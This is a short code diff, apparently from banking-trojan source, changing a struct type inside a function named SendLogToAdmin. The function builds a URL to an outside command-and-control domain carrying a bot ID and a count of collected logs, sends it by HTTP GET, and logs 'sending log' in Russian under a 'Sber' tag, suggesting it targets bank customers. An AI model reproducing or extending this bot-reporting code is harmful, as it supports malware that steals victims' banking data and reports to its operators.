@@ -123,7 +123,7 @@ static void SendLogToAdmin( int num )
 	char qr[128];
 	fwsprintfA pwsprintfA = Get_wsprintfA();
 	pwsprintfA( qr, "http://%s/set/bit.html?uid=%s&sum=%d&type=cber&mode=stat", domain, BOT_UID, num );
-	THTTPResponse Response;
+	THTTPResponseRec Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
 	DBG( "Sber", "Отсылка лога: %s", qr );
